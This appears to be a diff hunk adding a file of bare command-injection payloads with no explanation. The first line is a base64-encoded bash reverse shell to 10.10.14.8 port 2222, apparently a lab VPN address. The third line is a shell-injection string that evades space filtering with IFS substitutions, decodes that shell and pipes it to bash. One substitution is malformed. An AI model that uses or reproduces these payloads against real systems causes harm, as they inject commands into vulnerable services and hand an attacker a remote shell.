@@ -1,0 +1,3 @@
+YmFzaCAtaSA+JjEgL2Rldi90Y3AvMTAuMTAuMTQuOC8yMjIyIDA+JjE=
+
+;echo${IFS%??}"YmFzaCAtaSA+JjEgL2Rldi90Y3AvMTAuMTAuMTQuOC8yMjIyIDA+JjE="$IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
